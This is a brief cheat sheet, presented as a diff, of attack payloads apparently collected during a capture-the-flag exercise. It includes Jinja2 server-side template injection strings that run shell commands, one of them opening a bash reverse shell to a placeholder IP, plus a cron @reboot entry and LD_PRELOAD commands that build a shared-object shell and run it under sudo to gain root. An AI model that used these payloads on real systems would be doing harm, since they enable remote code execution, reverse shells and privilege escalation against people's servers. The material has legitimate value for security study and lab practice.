@@ -1,0 +1,15 @@
+{{''.__class__.mro()[1].__subclasses__()[396]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}
+{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}
+
+
+{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{ x()._module.__builtins__['__import__']('os').popen('bash -c "bash -i >& /dev/tcp/your_ip/your_port 0>&1"').read() }}{% endif %}{% endfor %}
+
+
+
+@reboot authbind --deep python3 /home/jed/app/app.py &
+
+
+Linux Privilege Escalation using LD_Preload
+
+gcc -fPIC -shared -o shell.so shell.c -nostartfiles
+sudo LD_PRELOAD=/home/jed/shell.so ps
